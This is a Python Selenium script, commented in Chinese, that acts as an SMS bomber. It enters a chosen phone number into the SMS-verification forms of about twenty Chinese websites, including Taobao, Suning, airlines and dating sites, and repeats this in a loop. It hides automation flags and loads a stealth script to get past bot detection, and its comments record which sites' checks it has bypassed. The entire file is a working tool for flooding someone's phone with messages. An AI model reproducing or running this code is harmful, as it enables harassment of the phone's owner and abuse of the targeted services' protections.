from selenium import webdriver
from selenium.webdriver import ActionChains
from selenium.webdriver.common.by import By
import time
import threading
import random


# 360借条
def send_360(phon_num):
    option = webdriver.ChromeOptions()
    option.add_argument("start-maximized")
    option.add_experimental_option('excludeSwitches', ['enable-automation'])
    option.add_experimental_option("useAutomationExtension", False)
    # option.add_argument('headless')
    option.add_argument("--disable-blink-features=AutomationControlled")
    browser = webdriver.Chrome(options=option)
    with open('./js/stealth.min.js') as f:
        js = f.read()
    browser.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
        "source": js
    })
    browser.get('https://www.360jie.com.cn/')
    for i in range(11):
        browser.find_element(By.NAME, "mobile").send_keys(phon_num[i])
        time.sleep(random.random())
    browser.find_element(By.ID, 'btnSendCode1').click()
    time.sleep(5)
    print("360借条——发送成功！")
    browser.close()


# 一号店，检测爬虫
def send_1hd(phon_num):
    option = webdriver.ChromeOptions()
    option.add_argument("start-maximized")
    option.add_experimental_option('excludeSwitches', ['enable-automation'])
    option.add_experimental_option("useAutomationExtension", False)
    option.add_argument('headless')
    option.add_argument("--disable-blink-features=AutomationControlled")
    browser = webdriver.Chrome(options=option)
    with open('./js/stealth.min.js') as f:
        js = f.read()
    browser.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
        "source": js
    })
    browser.get("https://passport.yhd.com/passport/register_input.do")
    for i in range(11):
        browser.find_element(By.ID, "phone").send_keys(phon_num[i])
        time.sleep(random.random())
    time.sleep(1.8)
    browser.find_element(By.XPATH, '//*[@id="validPhoneCode"]').click()
    time.sleep(2)
    browser.find_element(By.CLASS_NAME, "receive_code").click()
    time.sleep(200)
    print("1号店——发送成功！")
    browser.close()


# 淘宝已绕过
def send_taobao(phon_num):
    option = webdriver.ChromeOptions()
    option.add_argument("start-maximized")
    option.add_experimental_option('excludeSwitches', ['enable-automation'])
    option.add_experimental_option("useAutomationExtension", False)
    option.add_argument('headless')
    option.add_argument("--disable-blink-features=AutomationControlled")
    browser = webdriver.Chrome(options=option)
    with open('./js/stealth.min.js') as f:
        js = f.read()
    browser.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
        "source": js
    })
    browser.get('https://login.taobao.com/member/login.jhtml')
    browser.find_element(By.CLASS_NAME, 'sms-login-tab-item').click()
    for i in range(11):
        browser.find_element(By.ID, 'fm-sms-login-id').send_keys(phon_num[i])
        time.sleep(random.random())
    browser.find_element(By.CLASS_NAME, 'send-btn-link').click()
    time.sleep(4)
    print("淘宝——发送成功！")
    browser.close()


# 迅雷直播
def send_xllive(phon_num):
    option = webdriver.ChromeOptions()
    option.add_argument("start-maximized")
    option.add_experimental_option('excludeSwitches', ['enable-automation'])
    option.add_experimental_option("useAutomationExtension", False)
    option.add_argument('headless')
    option.add_argument("--disable-blink-features=AutomationControlled")
    browser = webdriver.Chrome(options=option)
    with open('./js/stealth.min.js') as f:
        js = f.read()
    browser.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
        "source": js
    })
    browser.get('https://live.xunlei.com/')
    time.sleep(1)
    browser.find_element(By.CLASS_NAME, 'nav_userarea').click()
    iframe = browser.find_element(By.ID, "loginIframe")
    browser.switch_to.frame(iframe)
    # browser.find_element(By.XPATH, '/html/body/div/div/div/div[4]/div[4]/p/a[3]').click()
    # browser.find_element(By.XPATH, '//*[@id="register_entry"]').click()
    browser.find_element(By.ID, "register_entry").click()
    for i in range(11):
        browser.find_element(By.ID, "pr_m").send_keys(phon_num[i])
        time.sleep(random.random())
    browser.find_element(By.ID, "pr_gc").click()
    time.sleep(4)
    print("迅雷直播——发送成功！")
    browser.close()


# 瓜子二手车
def send_guazi(phon_num):
    option = webdriver.ChromeOptions()
    option.add_argument("start-maximized")
    option.add_experimental_option('excludeSwitches', ['enable-automation'])
    option.add_experimental_option("useAutomationExtension", False)
    #option.add_argument('headless')
    option.add_argument("--disable-blink-features=AutomationControlled")
    browser = webdriver.Chrome(options=option)
    with open('./js/stealth.min.js') as f:
        js = f.read()
    browser.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
        "source": js
    })
    browser.get('https://www.guazi.com')
    time.sleep(1)
    browser.find_element(By.XPATH, "//*[@id='pageWrapper']/div[1]/div[3]/div[2]/div[1]/input").clear()
    for i in range(11):
        browser.find_element(By.XPATH, "//*[@id='pageWrapper']/div[1]/div[3]/div[2]/div[1]/input").send_keys(phon_num[i])
        time.sleep(random.random())
    browser.find_element(By.XPATH, "//*[@id='pageWrapper']/div[1]/div[3]/div[2]/div[2]/i").click()
    time.sleep(1)
    browser.find_element(By.XPATH, "/html/body/div/div/div/div[1]/div[8]/div[1]/div/div[3]/div[2]/div").click()
    time.sleep(1)
    browser.find_element(By.XPATH, "/html/body/div/div/div/div[1]/div[3]/div[2]/div[1]/button").click()
    time.sleep(1)
    browser.find_element(By.CLASS_NAME, 'input-common is--active').click()
    time.sleep(4)
    print("瓜子网——发送成功！")
    browser.close()


# 凤凰金融 有图形验证码
def send_fenghuang(phon_num):
    option = webdriver.ChromeOptions()
    option.add_argument("start-maximized")
    option.add_experimental_option('excludeSwitches', ['enable-automation'])
    option.add_experimental_option("useAutomationExtension", False)
    option.add_argument('headless')
    option.add_argument("--disable-blink-features=AutomationControlled")
    browser = webdriver.Chrome(options=option)
    with open('./js/stealth.min.js') as f:
        js = f.read()
    browser.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
        "source": js
    })
    browser.get('https://www.fengwd.com/')
    time.sleep(1)
    browser.find_element(By.XPATH, "//*[@class='top-bar-item login-tag']/a").click()
    time.sleep(2)
    # for i in range(11):
    # browser.find_element(By.ID, 'mobile_number').send_keys(phon_num[i])
    # time.sleep(random.random())
    browser.find_element(By.ID, 'mobile_number').send_keys(phon_num)
    browser.find_element(By.XPATH, "//*[@class='get-sms-captcha blue']").click()
    time.sleep(4)
    print("凤凰金融——发送成功！")
    browser.close()


# 苏宁易购——注册，已绕过
def send_suningregister(phon_num):
    option = webdriver.ChromeOptions()
    option.add_argument("start-maximized")
    option.add_experimental_option('excludeSwitches', ['enable-automation'])
    option.add_experimental_option("useAutomationExtension", False)
    option.add_argument('headless')
    option.add_argument("--disable-blink-features=AutomationControlled")
    browser = webdriver.Chrome(options=option)
    with open('./js/stealth.min.js') as f:
        js = f.read()
    browser.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
        "source": js
    })
    browser.get('https://reg.suning.com/person.do')
    time.sleep(1)
    browser.find_element(By.XPATH, "/html/body/div[5]/div[2]/div[2]/a").click()
    time.sleep(2)
    for i in range(11):
        browser.find_element(By.ID, 'mobileAlias').send_keys(phon_num[i])
        time.sleep(random.random())
    time.sleep(1)
    browser.find_element(By.ID, "sendSmsCode").click()
    time.sleep(4)
    print("苏宁易购注册——发送成功！")


# 苏宁易购——登录,有滑动
def send_suninglogin(phon_num):
    option = webdriver.ChromeOptions()
    option.add_argument("start-maximized")
    option.add_experimental_option('excludeSwitches', ['enable-automation'])
    option.add_experimental_option("useAutomationExtension", False)
    option.add_argument('headless')
    option.add_argument("--disable-blink-features=AutomationControlled")
    browser = webdriver.Chrome(options=option)
    with open('./js/stealth.min.js') as f:
        js = f.read()
    browser.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
        "source": js
    })
    browser.get('https://passport.suning.com/ids/login')
    time.sleep(1)
    browser.find_element(By.XPATH, "/html/body/div[2]/div[1]/div/div[1]/a[2]").click()
    time.sleep(1)
    browser.find_element(By.XPATH, '/html/body/div[2]/div[1]/div/div[2]/div[1]/div[7]/a[1]').click()
    time.sleep(2)
    element = browser.find_element(By.ID, 'phoneNumber')
    ActionChains(browser).move_to_element(element).perform()
    browser.find_element(By.ID, 'phoneNumber').click()
    for i in range(11):
        browser.find_element(By.ID, 'phoneNumber').send_keys(phon_num[i])
        time.sleep(random.random())
    time.sleep(1)
    browser.find_element(By.CLASS_NAME, "send-sms").click()
    time.sleep(4)
    print("苏宁易购登录-—发送成功！")


# 百合相亲网，有图形滑动码
def send_baihe(phon_num):
    option = webdriver.ChromeOptions()
    option.add_argument("start-maximized")
    option.add_experimental_option('excludeSwitches', ['enable-automation'])
    option.add_experimental_option("useAutomationExtension", False)
    option.add_argument('headless')
    option.add_argument("--disable-blink-features=AutomationControlled")
    browser = webdriver.Chrome(options=option)
    with open('./js/stealth.min.js') as f:
        js = f.read()
    browser.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
        "source": js
    })
    browser.get('https://my.baihe.com/register')
    time.sleep(1)
    for i in range(11):
        browser.find_element_by_id('account').send_keys(phon_num[i])
        time.sleep(random.random())
    browser.find_element_by_id('mobileValiCode_btn').click()
    time.sleep(4)
    browser.close()


# 巨人网络，有图形验证码
def send_juren(phon_num):
    option = webdriver.ChromeOptions()
    option.add_argument("start-maximized")
    option.add_experimental_option('excludeSwitches', ['enable-automation'])
    option.add_experimental_option("useAutomationExtension", False)
    option.add_argument('headless')
    option.add_argument("--disable-blink-features=AutomationControlled")
    browser = webdriver.Chrome(options=option)
    with open('./js/stealth.min.js') as f:
        js = f.read()
    browser.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
        "source": js
    })
    browser.get('http://reg.ztgame.com/')
    for i in range(11):
        browser.find_element(By.NAME, "phone").send_keys(phon_num[i])
        time.sleep(random.random())
    browser.find_element(By.NAME, "get_mpcode").click()
    time.sleep(5)
    print("巨人网络——发送成功！")
    browser.close()


# 金融号
def send_jrh(phon_num):
    option = webdriver.ChromeOptions()
    option.add_argument("start-maximized")
    option.add_experimental_option('excludeSwitches', ['enable-automation'])
    option.add_experimental_option("useAutomationExtension", False)
    option.add_argument('headless')
    option.add_argument("--disable-blink-features=AutomationControlled")
    browser = webdriver.Chrome(options=option)
    with open('./js/stealth.min.js') as f:
        js = f.read()
    browser.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
        "source": js
    })
    browser.get('http://jrh.financeun.com/Login/jrwRegist.html?web=jrh')
    for i in range(11):
        browser.find_element(By.ID, "mobile").send_keys(phon_num[i])
        time.sleep(random.random())
    browser.find_element(By.ID, "sendMsgCode").click()
    time.sleep(5)
    print("金融号——发送成功！")
    browser.close()


# 四川航空
def send_sichuanair(phon_num):
    option = webdriver.ChromeOptions()
    option.add_argument("start-maximized")
    option.add_experimental_option('excludeSwitches', ['enable-automation'])
    option.add_experimental_option("useAutomationExtension", False)
    option.add_argument('headless')
    option.add_argument("--disable-blink-features=AutomationControlled")
    browser = webdriver.Chrome(options=option)
    with open('./js/stealth.min.js') as f:
        js = f.read()
    browser.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
        "source": js
    })
    browser.get('http://flights.sichuanair.com/3uair/ibe/profile/createProfile.do')
    try:
        browser.find_element(By.XPATH, '/html/body/div[2]/div[3]/a').click()
    finally:
        for i in range(11):
            browser.find_element(By.NAME, 'mobilePhone').send_keys(phon_num[i])
            time.sleep(random.random())
        time.sleep(1)
        browser.find_element(By.ID, 'sendSmsCode').click()
        time.sleep(5)
        print("四川航空——发送成功！")
        browser.close()


# 昆明航空
def send_airkunming(phon_num):
    option = webdriver.ChromeOptions()
    option.add_argument("start-maximized")
    option.add_experimental_option('excludeSwitches', ['enable-automation'])
    option.add_experimental_option("useAutomationExtension", False)
    option.add_argument('headless')
    option.add_argument("--disable-blink-features=AutomationControlled")
    browser = webdriver.Chrome(options=option)
    with open('./js/stealth.min.js') as f:
        js = f.read()
    browser.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
        "source": js
    })
    browser.get('https://www.airkunming.com/#/user/register')
    for i in range(11):
        browser.find_element(By.ID, 'mobile').send_keys(phon_num[i])
        time.sleep(random.random())
    time.sleep(1)
    browser.find_element(By.XPATH, "//*[@class='sms-code']").click()
    time.sleep(4)
    print("昆明航空——发送成功！")
    browser.close()


# 有赞云，有滑块
def send_youzan(phon_num):
    option = webdriver.ChromeOptions()
    option.add_argument("start-maximized")
    option.add_experimental_option('excludeSwitches', ['enable-automation'])
    option.add_experimental_option("useAutomationExtension", False)
    option.add_argument('headless')
    option.add_argument("--disable-blink-features=AutomationControlled")
    browser = webdriver.Chrome(options=option)
    with open('./js/stealth.min.js') as f:
        js = f.read()
    browser.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
        "source": js
    })
    browser.get('https://diy.youzanyun.com/login/retrieve')
    for i in range(11):
        browser.find_element(By.XPATH, "//*[@class = 'zent-input phone']").send_keys(phon_num[i])
        time.sleep(random.random())
    time.sleep(1)
    browser.find_element(By.XPATH, "//*[@class = 'sms-btn']").click()
    time.sleep(4)
    print("有赞云——发送成功！")
    browser.close()


# 安徽相亲网
def send_anhuixiangiqn(phon_num):
    option = webdriver.ChromeOptions()
    option.add_argument("start-maximized")
    option.add_experimental_option('excludeSwitches', ['enable-automation'])
    option.add_experimental_option("useAutomationExtension", False)
    option.add_argument('headless')
    option.add_argument("--disable-blink-features=AutomationControlled")
    browser = webdriver.Chrome(options=option)
    with open('./js/stealth.min.js') as f:
        js = f.read()
    browser.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
        "source": js
    })
    browser.get('http://www.ahxiangqin.cn/index.php?c=passport&a=reg')
    for i in range(11):
        browser.find_element(By.NAME, 'mobile').send_keys(phon_num[i])
        time.sleep(random.random())
    time.sleep(1)
    # browser.find_element_by_class_name('action-send-mobile-code get').click()
    browser.find_element(By.ID, "but_send_mobile_code").click()
    time.sleep(4)
    print("安徽相亲网——发送成功！")
    browser.close()


# 我主良缘
def send_wozhuliangyuan(phon_num):
    option = webdriver.ChromeOptions()
    option.add_argument("start-maximized")
    option.add_experimental_option('excludeSwitches', ['enable-automation'])
    option.add_experimental_option("useAutomationExtension", False)
    option.add_argument('headless')
    option.add_argument("--disable-blink-features=AutomationControlled")
    browser = webdriver.Chrome(options=option)
    with open('./js/stealth.min.js') as f:
        js = f.read()
    browser.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
        "source": js
    })
    browser.get('http://m.7799520.com/register.html')
    for i in range(11):
        browser.find_element(By.NAME, 'mobile').send_keys(phon_num[i])
        time.sleep(random.random())
    time.sleep(1)
    bu = browser.find_elements(By.TAG_NAME, 'button')
    for i in bu:
        i.click()
        time.sleep(2)
    print("我主良缘——发送成功！")
    browser.close()


# 迪卡侬
def send_dikanong(phon_num):
    option = webdriver.ChromeOptions()
    option.add_argument("start-maximized")
    option.add_experimental_option('excludeSwitches', ['enable-automation'])
    option.add_experimental_option("useAutomationExtension", False)
    option.add_argument('headless')
    option.add_argument("--disable-blink-features=AutomationControlled")
    browser = webdriver.Chrome(options=option)
    with open('./js/stealth.min.js') as f:
        js = f.read()
    browser.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
        "source": js
    })
    browser.get('https://www.decathlon.com.cn/zh/login')
    for i in range(11):
        browser.find_element(By.ID, 'login').send_keys(phon_num[i])
        time.sleep(random.random())
    time.sleep(1)
    browser.find_element(By.XPATH, '//*[@id="validate-block"]/button').click()
    time.sleep(5)
    print("迪卡侬——发送成功！")
    browser.close()


# CSDN
def send_csdn(phon_num):
    option = webdriver.ChromeOptions()
    option.add_argument("start-maximized")
    option.add_experimental_option('excludeSwitches', ['enable-automation'])
    option.add_experimental_option("useAutomationExtension", False)
    # option.add_argument('headless')
    option.add_argument("--disable-blink-features=AutomationControlled")
    browser = webdriver.Chrome(options=option)
    with open('./js/stealth.min.js') as f:
        js = f.read()
    browser.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
        "source": js
    })
    browser.get('https://passport.csdn.net/newlogin?code=mobile')
    for i in range(11):
        browser.find_element(By.XPATH, '/html/body/div[2]/div/div[2]/div/div[1]/div[1]/div[2]/div/div[1]/div/div['
                                       '3]/input').send_keys(phon_num[i])
        time.sleep(random.random())
    time.sleep(1)
    browser.find_element(By.XPATH,
                         '/html/body/div[2]/div/div[2]/div/div[1]/div[1]/div[2]/div/div[2]/div/span[1]').click()
    time.sleep(5)
    print("CSDN-—发送成功！")
    browser.close()


# 大宗物流
def send_dazongwuliu(phon_num):
    option = webdriver.ChromeOptions()
    option.add_argument("start-maximized")
    option.add_experimental_option('excludeSwitches', ['enable-automation'])
    option.add_experimental_option("useAutomationExtension", False)
    option.add_argument('headless')
    option.add_argument("--disable-blink-features=AutomationControlled")
    browser = webdriver.Chrome(options=option)
    with open('./js/stealth.min.js') as f:
        js = f.read()
    browser.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
        "source": js
    })
    browser.get('https://www.sxmaiterui.com/register.html')
    for i in range(11):
        browser.find_element(By.ID, 'phone').send_keys(phon_num[i])
        time.sleep(random.random())
    time.sleep(1)
    browser.find_element(By.XPATH, '//*[@id="get"]').click()
    time.sleep(5)
    print("大宗物流——发送成功！")
    browser.close()


# 世纪佳缘，已绕过检测
def send_sjjy(phon_num):
    option = webdriver.ChromeOptions()
    option.add_argument("start-maximized")
    option.add_experimental_option('excludeSwitches', ['enable-automation'])
    option.add_experimental_option("useAutomationExtension", False)
    option.add_argument('headless')
    option.add_argument("--disable-blink-features=AutomationControlled")
    browser = webdriver.Chrome(options=option)
    with open('./js/stealth.min.js') as f:
        js = f.read()
    browser.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
        "source": js
    })
    browser.get('https://reg.jiayuan.com/signup/fillbasic.php')
    for i in range(11):
        browser.find_element(By.ID, 'phoneNumber').send_keys(phon_num[i])
        time.sleep(random.random())
    browser.find_element(By.ID, 'mobile_vali').click()
    time.sleep(1)
    browser.find_element(By.XPATH, '//*[@id="get"]').click()
    time.sleep(5)
    print("世纪佳缘——发送成功！")
    browser.close()


# IT桔子，需要点击，已绕过
def send_itjuzi(phon_num):
    option = webdriver.ChromeOptions()
    option.add_argument("start-maximized")
    option.add_experimental_option('excludeSwitches', ['enable-automation'])
    option.add_experimental_option("useAutomationExtension", False)
    option.add_argument('headless')
    option.add_argument("--disable-blink-features=AutomationControlled")
    browser = webdriver.Chrome(options=option)
    with open('./js/stealth.min.js') as f:
        js = f.read()
    browser.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
        "source": js
    })
    browser.get('https://www.itjuzi.com/register')
    for i in range(11):
        browser.find_element(By.NAME, 'phone').send_keys(phon_num[i])
        time.sleep(random.random())
    browser.find_element(By.XPATH, '//*[@id="app"]/div[1]/div[2]/div/div/div[1]/form/div[3]/div[2]/input').click()
    time.sleep(2)
    browser.find_element(By.XPATH, '//*[@id="app"]/div[1]/div[2]/div/div/div[1]/form/div[3]/div[2]/div').click()
    time.sleep(3)
    browser.find_element(By.XPATH, '//*[@id="Shape3"]').click()
    time.sleep(5)
    print("IT桔子——发送成功！")
    browser.close()


# 百度网盘，要输入图形验证码
def send_baiduwp(phon_num):
    option = webdriver.ChromeOptions()
    option.add_argument("start-maximized")
    option.add_experimental_option('excludeSwitches', ['enable-automation'])
    option.add_experimental_option("useAutomationExtension", False)
    # option.add_argument('headless')
    option.add_argument("--disable-blink-features=AutomationControlled")
    browser = webdriver.Chrome(options=option)
    with open('./js/stealth.min.js') as f:
        js = f.read()
    browser.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
        "source": js
    })
    browser.get('https://yun.baidu.com')
    time.sleep(3)
    browser.find_element(By.XPATH, '/html/body/div[1]/div[3]/div[6]/div/div[1]/form/p[9]/a[2]').click()
    for i in range(11):
        browser.find_element(By.XPATH, '/html/body/div[1]/div[3]/div[6]/div/div[2]/form/div/input').send_keys(phon_num[i])
        time.sleep(random.random())
    browser.find_element(By.XPATH, '/html/body/div[1]/div[3]/div[6]/div/div[2]/form/p[3]/button').click()
    time.sleep(5)
    print("百度网盘——发送成功！")
    browser.close()


if __name__ == "__main__":
    phon_num = input('输入需要短信测压的手机号:')
    run_roll = input('测压循环次数:')
    run_roll = int(run_roll)
    for _ in range(run_roll):
        print("第" + str(_ + 1) + "次测压进行中....")
        threading.Thread(target=send_360(phon_num)).start()  # 360借条
        threading.Thread(target=send_taobao(phon_num)).start()  # 淘宝
        threading.Thread(target=send_xllive(phon_num)).start()  # 迅雷直播
        # threading.Thread(target=send_guazi(phon_num)).start()               # 瓜子
        threading.Thread(target=send_suningregister(phon_num)).start()  # 苏宁易购——注册
        threading.Thread(target=send_jrh(phon_num)).start()  # 金融号
        threading.Thread(target=send_sichuanair(phon_num)).start()  # 四川航空
        threading.Thread(target=send_airkunming(phon_num)).start()  # 昆明航空
        threading.Thread(target=send_anhuixiangiqn(phon_num)).start()  # 安徽相亲网
        threading.Thread(target=send_wozhuliangyuan(phon_num)).start()  # 我主良缘
        threading.Thread(target=send_dikanong(phon_num)).start()  # 迪卡侬
        threading.Thread(target=send_csdn(phon_num)).start()  # CSDN
        threading.Thread(target=send_dazongwuliu(phon_num)).start()  # 大宗物流
        threading.Thread(target=send_sjjy(phon_num)).start()  # 世纪佳缘
        threading.Thread(target=send_itjuzi(phon_num)).start()  # IT桔子
        # threading.Thread(target=send_baiduwp(phon_num)).start()  # 百度网盘
        time.sleep(4)
